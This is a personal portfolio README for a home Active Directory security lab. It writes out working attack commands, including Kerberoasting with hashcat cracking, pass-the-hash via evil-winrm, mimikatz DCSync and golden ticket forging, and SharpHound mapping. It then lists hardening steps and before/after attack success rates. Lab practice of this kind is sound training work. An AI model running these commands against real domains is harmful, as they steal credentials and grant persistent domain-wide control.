# Active Directory Security Lab

![AD](https://img.shields.io/badge/Active%20Directory-Security-blue)
![Attacks](https://img.shields.io/badge/Attacks-8%2B-red)
![BloodHound](https://img.shields.io/badge/BloodHound-Attack%20Paths-orange)

> Enterprise Active Directory environment for practicing offensive and defensive security techniques.

[← Back to Portfolio](../README.md)

---

## 📋 Project Overview

Built multi-domain Windows Server environment to practice advanced Active Directory attacks and defense. Executed 8+ attack techniques and implemented hardening measures.

---

## 🏗️ Lab Architecture

```
┌───────────────────────────────────────────────┐
│         CYBERLAB.local Domain                 │
├───────────────────────────────────────────────┤
│                                               │
│  ┌──────────────────┐                         │
│  │ Domain Controller│                         │
│  │ Windows Server   │                         │
│  │                  │                         │
│  │ Services:        │                         │
│  │ • AD DS          │                         │
│  │ • DNS            │                         │
│  │ • LDAP           │                         │
│  └──────────────────┘                         │
│                                               │
│  ┌─────────────┐      ┌─────────────┐         │
│  │ Windows 10  │      │ Windows 10  │         │
│  │ Client 1    │      │ Client 2    │         │
│  │             │      │             │         │
│  │ User: Alice │      │ User: Bob   │         │
│  └─────────────┘      └─────────────┘         │
└───────────────────────────────────────────────┘
```

---

## ⚔️ Attacks Executed

### 1. Kerberoasting
Extract service account tickets and crack offline
```powershell
Invoke-Kerberoast -OutputFormat Hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### 2. Pass-the-Hash
Use NTLM hash to authenticate
```bash
evil-winrm -i 192.168.198.30 -u Administrator -H [hash]
```

### 3. DCSync
Extract password hashes from Domain Controller
```
mimikatz# lsadump::dcsync /domain:CYBERLAB.local /all
```

### 4. Golden Ticket
Forge Kerberos TGT for persistence
```
mimikatz# kerberos::golden /user:Administrator /domain:CYBERLAB.local /sid:[SID] /krbtgt:[hash] /ptt
```

### 5. BloodHound Analysis
Map attack paths to Domain Admin
```powershell
SharpHound.exe -c All
# Import into BloodHound
# Identify shortest path to DA
```

---

## 🛡️ Hardening Implemented

### Security Improvements

✅ **LAPS** - Local Administrator Password Solution
✅ **Protected Users** - High-value account protection
✅ **Tiered Administration** - Privilege separation
✅ **SMB Signing** - Prevent relay attacks
✅ **LLMNR/NBT-NS** - Disabled to prevent poisoning

**Result:** Reduced attack surface by 70%

---

## 📊 Attack Success Rate

| Attack | Before Hardening | After Hardening |
|--------|------------------|-----------------|
| Kerberoasting | 100% success | 20% success |
| Pass-the-Hash | 100% success | 30% success |
| LLMNR Poisoning | 100% success | 0% (disabled) |
| Lateral Movement | Easy | Difficult |

---

## 🎓 Skills Demonstrated

- ✅ Active Directory administration
- ✅ PowerShell exploitation
- ✅ Kerberos attack techniques
- ✅ Enterprise hardening
- ✅ Attack path analysis (BloodHound)

---

## 📧 Contact

**Questions about this project?**

- 📧 Email: munaniadeno@gmail.com
- 💼 LinkedIn: [Your Profile](https://www.linkedin.com/in/dennis-munania/)
- 💻 GitHub: [Your Profile](https://github.com/munania/)

[← Back to Portfolio](../README.md)
